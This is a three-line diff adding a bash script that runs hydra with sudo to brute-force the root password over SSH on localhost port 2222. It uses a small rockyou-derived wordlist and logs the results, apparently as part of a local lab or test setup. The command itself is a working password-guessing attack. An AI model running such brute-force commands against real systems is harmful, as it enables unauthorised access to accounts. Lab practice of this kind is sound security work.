@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+
+sudo hydra -l root -P mini_rockyou.txt ssh://localhost:2222 -t 4 > hydra_log.txt
